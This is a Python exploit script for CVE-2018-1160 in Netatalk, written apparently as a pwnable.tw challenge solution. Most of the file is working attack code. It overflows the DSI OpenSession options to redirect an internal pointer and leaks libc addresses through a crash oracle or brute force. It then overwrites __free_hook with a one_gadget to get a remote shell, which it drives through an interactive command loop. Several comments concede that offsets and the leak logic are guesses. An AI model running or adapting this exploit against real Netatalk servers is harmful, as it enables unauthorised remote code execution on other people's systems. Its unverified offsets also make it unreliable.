#!/usr/bin/env python3
"""
CVE-2018-1160 Netatalk Remote Code Execution Exploit
pwnable.tw challenge

Vulnerability: Out-of-bounds write in dsi_opensess.c
The DSI OpenSession handler (dsi_opensession) has no proper bounds checking
when parsing client options. An oversized DSIOPT_ATTNQUANT option causes
a heap buffer overflow that overwrites critical DSI struct fields.

Overflow Target Fields (relative to options buffer):
+0x00: attn_quantum (4 bytes)
+0x04: datasize (4 bytes)
+0x08: server_quantum (4 bytes) - reflected back to client!
+0x0c: serverID (2 bytes)
+0x0e: clientID (2 bytes)
+0x10: commands (8 bytes) - pointer to DSI receive buffer (CRITICAL!)
+0x18: data buffer...

Exploitation Strategy:
1. Use byte-by-byte oracle to leak libc address (fork server preserves layout)
2. Overwrite 'commands' ptr to __free_hook - offset
3. Send DSI command that writes one_gadget/system to __free_hook
4. Trigger free() via dsi_close -> RCE

References:
- https://netatalk.io/security/CVE-2018-1160
- https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160
- https://shxdow.me/cve-2018-1160/
"""

import socket
import struct
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

# ============================================================================
# Protocol Constants
# ============================================================================

# DSI Commands
DSI_CLOSESESSION = 0x01
DSI_COMMAND = 0x02
DSI_GETSTATUS = 0x03
DSI_OPENSESSION = 0x04
DSI_TICKLE = 0x05
DSI_WRITE = 0x06
DSI_ATTENTION = 0x08

# DSI Options
DSIOPT_ATTNQUANT = 0x01
DSIOPT_SERVQUANT = 0x00

# AFP Commands
AFP_LOGOUT = 0x14

# ============================================================================
# Libc Offsets (libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so)
# ============================================================================

LIBC_FREE_HOOK = 0x3ED8E8
LIBC_MALLOC_HOOK = 0x3EBC30
LIBC_SYSTEM = 0x4F440
LIBC_BINSH = 0x1B3E9A
LIBC_EXECVE = 0xE4E30

# One gadgets (constraints vary - may need to try multiple)
# Run: one_gadget libc.so
ONE_GADGETS = [
    0x4F2C5,  # execve("/bin/sh", rsp+0x40, environ)
    0x4F322,  # execve("/bin/sh", rsp+0x40, environ)
    0x10A38C,  # execve("/bin/sh", rsp+0x70, environ)
]

# ============================================================================
# DSI Protocol Handler
# ============================================================================


class DSI:
    """DSI Protocol implementation for Netatalk communication"""

    def __init__(self, host, port, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.req_id = 0

    def connect(self):
        """Establish TCP connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        return True

    def disconnect(self):
        """Close connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None

    def send(self, data):
        """Send raw data"""
        self.sock.sendall(data)

    def recv(self, size=4096):
        """Receive data"""
        return self.sock.recv(size)

    def make_header(self, cmd, length, req_id=None, flags=0x00, err_offset=0):
        """
        Create 16-byte DSI header:
        - flags: 1 byte (0x00 = request, 0x01 = reply)
        - command: 1 byte
        - request_id: 2 bytes
        - error_code/data_offset: 4 bytes
        - total_data_length: 4 bytes
        - reserved: 4 bytes
        """
        if req_id is None:
            self.req_id += 1
            req_id = self.req_id
        return struct.pack(">BBHIII", flags, cmd, req_id, err_offset, length, 0)

    def recv_response(self, timeout=None):
        """Receive and parse DSI response"""
        if timeout:
            self.sock.settimeout(timeout)
        try:
            header = self.sock.recv(16)
            if len(header) < 16:
                return None

            flags, cmd, req_id, err_code, length, reserved = struct.unpack(
                ">BBHIII", header
            )

            data = b""
            while len(data) < length:
                chunk = self.sock.recv(min(length - len(data), 4096))
                if not chunk:
                    break
                data += chunk

            return {
                "flags": flags,
                "cmd": cmd,
                "req_id": req_id,
                "error": err_code,
                "length": length,
                "data": data,
            }
        except socket.timeout:
            return None
        except Exception as e:
            return None

    def open_session(self, options=b""):
        """Send DSI OpenSession with options"""
        hdr = self.make_header(DSI_OPENSESSION, len(options))
        self.send(hdr + options)
        return self.recv_response()

    def close_session(self):
        """Send DSI CloseSession"""
        hdr = self.make_header(DSI_CLOSESESSION, 0)
        self.send(hdr)

    def get_status(self):
        """Send DSI GetStatus (no auth required)"""
        hdr = self.make_header(DSI_GETSTATUS, 0)
        self.send(hdr)
        return self.recv_response()

    def send_command(self, afp_cmd, data=b""):
        """Send DSI Command (AFP command wrapper)"""
        payload = bytes([afp_cmd]) + data
        hdr = self.make_header(DSI_COMMAND, len(payload))
        self.send(hdr + payload)
        return self.recv_response()


# ============================================================================
# Exploit Functions
# ============================================================================


def build_overflow_options(target_addr):
    """
    Build malicious DSIOPT_ATTNQUANT option that overflows into DSI struct

    Layout being overwritten:
    +0x00: attn_quantum   (4 bytes)
    +0x04: datasize       (4 bytes)
    +0x08: server_quantum (4 bytes) - reflected in response!
    +0x0c: serverID       (2 bytes)
    +0x0e: clientID       (2 bytes)
    +0x10: commands       (8 bytes) - our target!
    """
    payload = b""
    payload += p32(0x00040000)  # attn_quantum
    payload += p32(0x00100000)  # datasize (1MB)
    payload += p32(0xCAFEBABE)  # server_quantum (marker)
    payload += p16(0x0001)  # serverID
    payload += p16(0x0001)  # clientID
    payload += p64(target_addr)  # commands ptr (OVERWRITE!)

    # Build as oversized DSIOPT_ATTNQUANT
    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
    return option


def probe_address_valid(host, port, test_addr, timeout=3):
    """
    Test if address is writable using crash oracle technique.
    Fork server model: child crash = connection drops, valid = response received.

    IMPORTANT: The crash happens when we WRITE to the redirected commands pointer,
    not during the overflow itself. So we need to:
    1. Send overflow (redirects commands ptr)
    2. Send another packet (this writes to the redirected address)
    3. Check if we get a response (valid) or connection dies (invalid)
    """
    dsi = DSI(host, port, timeout)
    try:
        dsi.connect()

        # Step 1: Overflow to redirect commands ptr to test_addr
        options = build_overflow_options(test_addr)
        hdr = dsi.make_header(DSI_OPENSESSION, len(options))
        dsi.send(hdr + options)

        # Get response from overflow (should always succeed)
        resp1 = dsi.recv_response(timeout=timeout)
        if not resp1:
            return False

        # Step 2: Send another packet - THIS is when crash happens if addr is invalid
        # The data from this packet will be written to test_addr
        # Use a small benign command
        hdr2 = dsi.make_header(DSI_TICKLE, 0)  # Tickle is a no-op
        dsi.send(hdr2)

        # Step 3: Try to get response - if we get one, address was valid
        resp2 = dsi.recv_response(timeout=timeout)
        dsi.disconnect()

        return resp2 is not None

    except Exception as e:
        return False
    finally:
        dsi.disconnect()


def leak_address_byte_by_byte(host, port, high_byte_hint=0x7F):
    """
    Leak libc/heap address using byte-by-byte oracle.
    Fork server preserves memory layout across connections.

    Returns: 6-byte address (48-bit virtual address space)
    """
    log.info("Starting byte-by-byte address leak...")

    known = b""

    for pos in range(6):
        log.info(f"Bruting byte {pos}/5...")
        found = False
        attempts = 0

        # Optimize search order
        if pos == 5:
            # High byte: libc usually 0x7f, heap 0x55-0x56
            order = [high_byte_hint] + list(range(0x55, 0x58)) + list(range(256))
        else:
            order = list(range(256))

        for test in order:
            attempts += 1
            addr_bytes = known + bytes([test])
            # Pad to 8 bytes (high 2 bytes are 0x00)
            addr = u64(addr_bytes.ljust(8, b"\x00"))

            # Progress indicator every 16 attempts
            if attempts % 16 == 0:
                log.info(f"  Byte {pos}: tried {attempts}/256, current: 0x{test:02x}")

            if probe_address_valid(host, port, addr):
                known = addr_bytes
                log.success(f"Byte {pos}: 0x{test:02x} (addr so far: {hex(addr)}) after {attempts} attempts")
                found = True
                break

        if not found:
            log.warning(f"Failed at byte {pos} after {attempts} attempts")
            log.warning("This might mean the oracle technique doesn't work as expected")
            log.warning("Try running the exploit multiple times or check network connectivity")
            return None

    final_addr = u64(known.ljust(8, b"\x00"))
    log.success(f"Leaked address: {hex(final_addr)}")
    return final_addr


def bruteforce_libc_base(host, port):
    """
    Bruteforce libc base by probing __free_hook addresses.
    With ASLR, libc loads at 0x7fXXXXXXX000 (page aligned).
    We test if __free_hook at each candidate base is writable.
    """
    log.info("Bruteforcing libc base address...")

    # Libc typically loads in range 0x7f0000000000 - 0x7fffffffffff
    # With 12-bit entropy for libraries, ~4096 possible positions
    # But we can narrow down by page alignment

    # Common libc base patterns - start from typical ranges
    base_start = 0x7F0000000000
    base_end = 0x7FFFFFFFFFFF

    # Step by 0x1000 (page size) but libc is larger, so step by 0x200000 (2MB)
    # to reduce search space, then refine
    step = 0x1000  # Fine-grained search

    # Calculate where __free_hook would be
    free_hook_offset = LIBC_FREE_HOOK

    attempts = 0
    max_attempts = 0x10000  # Limit to prevent infinite loop

    # Try common base addresses first (from /proc/pid/maps patterns)
    common_prefixes = [0x7F, 0x7E]

    for prefix in common_prefixes:
        log.info(f"Trying prefix 0x{prefix:02x}...")

        # Iterate through possible page-aligned bases
        for page in range(0x1000):  # 4096 pages
            base = (prefix << 40) | (page << 28)  # Align to typical libc loading

            free_hook = base + free_hook_offset
            target = free_hook - 0x10  # We write starting 16 bytes before

            if probe_address_valid(host, port, target):
                log.success(f"Found valid libc base candidate: {hex(base)}")
                log.success(f"__free_hook at: {hex(free_hook)}")
                return base

            attempts += 1
            if attempts % 100 == 0:
                log.info(f"Attempt {attempts}... current test: {hex(base)}")

            if attempts >= max_attempts:
                break

    log.error("Bruteforce exhausted")
    return None


def do_exploit(host, port, libc_base, gadget_idx=0):
    """
    Execute full RCE exploit chain:
    1. Overflow commands ptr to __free_hook - 0x10
    2. Write one_gadget address via next DSI command
    3. Trigger free() via close
    """
    free_hook = libc_base + LIBC_FREE_HOOK
    system_addr = libc_base + LIBC_SYSTEM
    binsh_addr = libc_base + LIBC_BINSH
    one_gadget = libc_base + ONE_GADGETS[gadget_idx]

    log.info(f"libc base:   {hex(libc_base)}")
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"one_gadget:  {hex(one_gadget)}")
    log.info(f"system:      {hex(system_addr)}")
    log.info(f"/bin/sh:     {hex(binsh_addr)}")

    dsi = DSI(host, port, timeout=10)

    try:
        dsi.connect()
        log.success(f"Connected to {host}:{port}")

        # Step 1: Overflow commands ptr
        # Point to free_hook - 0x10 so our payload lands at free_hook
        target = free_hook - 0x10
        log.info(f"Step 1: Overflowing commands ptr to {hex(target)}")

        options = build_overflow_options(target)
        resp = dsi.open_session(options)

        if not resp:
            log.error("OpenSession failed - crash or timeout")
            return False

        log.success("Overflow successful - commands redirected!")

        # Parse response for info leak
        if resp.get("data"):
            log.info(f"Response data: {resp['data'].hex()}")

        # Step 2: Write one_gadget to __free_hook
        # Next write goes to controlled commands location
        # DSI header is 16 bytes, so payload starts at target + 0x10 = free_hook
        log.info("Step 2: Writing one_gadget to __free_hook...")

        # The payload written to commands will be: DSI header (parsed) + our data
        # After header parsing, data lands at commands + some_offset
        # We need to align so gadget address hits exactly at free_hook

        # Simple approach: send data that will be written at the target
        # The memcpy in dsi_stream_receive writes to commands buffer

        # Build payload: padding + gadget address
        # Exact offset may need adjustment based on DSI receive behavior
        payload = p64(one_gadget)  # Direct write attempt

        hdr = dsi.make_header(DSI_COMMAND, len(payload))
        dsi.send(hdr + payload)

        time.sleep(0.1)

        # Step 3: Trigger free by closing session
        log.info("Step 3: Triggering __free_hook via close...")
        dsi.close_session()

        # If successful, we should have a shell now
        log.info("Attempting to interact...")

        dsi.sock.settimeout(3)

        # Try sending a command
        dsi.sock.send(b"id\n")
        time.sleep(0.3)

        try:
            result = dsi.sock.recv(1024)
            if result:
                log.success(f"Got response: {result.decode(errors='ignore')}")

                # Drop into interactive shell
                log.info("Entering interactive mode...")
                while True:
                    try:
                        cmd = input("$ ")
                        if cmd.lower() in ["exit", "quit"]:
                            break
                        dsi.sock.send(cmd.encode() + b"\n")
                        time.sleep(0.3)
                        resp = dsi.sock.recv(4096)
                        print(resp.decode(errors="ignore"), end="")
                    except (EOFError, KeyboardInterrupt):
                        break
                return True
        except socket.timeout:
            log.warning("No response - shell may not have spawned")

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback

        traceback.print_exc()

    finally:
        dsi.disconnect()

    return False


def recon(host, port):
    """Initial reconnaissance - get server info"""
    log.info("=== Reconnaissance ===")

    dsi = DSI(host, port)
    try:
        dsi.connect()

        # Get server status
        resp = dsi.get_status()
        if resp:
            data = resp["data"]
            log.info(f"Server status ({len(data)} bytes)")

            # Parse AFP server info
            if len(data) > 2:
                # Machine type offset
                machine_type_offset = struct.unpack(">H", data[0:2])[0]
                log.info(f"Machine type offset: {machine_type_offset}")

                if machine_type_offset < len(data):
                    # Extract server signature area
                    log.info(f"Data preview: {data[:64].hex()}")

    except Exception as e:
        log.error(f"Recon failed: {e}")
    finally:
        dsi.disconnect()


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        host = "localhost"
        port = 5566  # From afp.conf
    else:
        host = "chall.pwnable.tw"
        port = 10002

    log.info(f"Target: {host}:{port}")
    log.info("CVE-2018-1160 Netatalk RCE Exploit")
    log.info("=" * 50)

    # Step 1: Recon
    recon(host, port)

    # Step 2: Leak libc __free_hook address using byte-by-byte oracle
    log.info("=== Address Leak Phase ===")
    log.info("Leaking __free_hook address byte-by-byte...")
    log.info("Target: libc __free_hook (offset 0x%x)" % LIBC_FREE_HOOK)
    log.info("This may take 5-15 minutes (up to 256 probes per byte, 6 bytes)...")

    # The byte-by-byte oracle finds a valid writable address
    # We want to find __free_hook, so we'll probe for it directly
    leaked = leak_address_byte_by_byte(host, port, high_byte_hint=0x7F)

    if not leaked:
        log.error("Failed to leak address via byte-by-byte")
        log.info("Falling back to bruteforce...")
        libc_base = bruteforce_libc_base(host, port)
        if not libc_base:
            log.error("All methods failed")
            return
    else:
        # The leaked address is a valid writable address
        # Calculate libc base assuming it's in libc's data section
        # Common offsets for writable sections: 0x3E0000 - 0x3F0000
        log.info(f"Leaked valid address: {hex(leaked)}")

        # Try multiple offsets to find correct libc base
        # The leaked address might be __free_hook itself or nearby
        possible_offsets = [
            LIBC_FREE_HOOK,           # If we hit __free_hook directly
            LIBC_FREE_HOOK - 0x10,    # If we hit __free_hook - 16
            LIBC_MALLOC_HOOK,         # If we hit __malloc_hook
            0x3ED000,                 # .bss section start estimate
        ]

        libc_base = None
        for offset in possible_offsets:
            candidate = leaked - offset
            if candidate & 0xFFF == 0:  # Page aligned
                log.info(f"Trying libc base: {hex(candidate)} (offset {hex(offset)})")
                # Verify by checking if __free_hook at this base is valid
                test_hook = candidate + LIBC_FREE_HOOK
                if probe_address_valid(host, port, test_hook - 0x10):
                    libc_base = candidate
                    log.success(f"Confirmed libc base: {hex(libc_base)}")
                    break

        if not libc_base:
            # Just use the estimate
            libc_base = (leaked - LIBC_FREE_HOOK) & ~0xFFF
            log.warning(f"Using estimated libc base: {hex(libc_base)}")

    # Step 3: Exploit
    log.info("=== Exploitation Phase ===")
    log.info(f"libc base: {hex(libc_base)}")

    for i, gadget_offset in enumerate(ONE_GADGETS):
        log.info(f"Trying one_gadget {i}: offset {hex(gadget_offset)}")
        if do_exploit(host, port, libc_base, i):
            log.success("Exploit successful!")
            return
        log.warning(f"one_gadget {i} failed, trying next...")
        time.sleep(1)

    log.error("All one_gadgets failed")


if __name__ == "__main__":
    main()
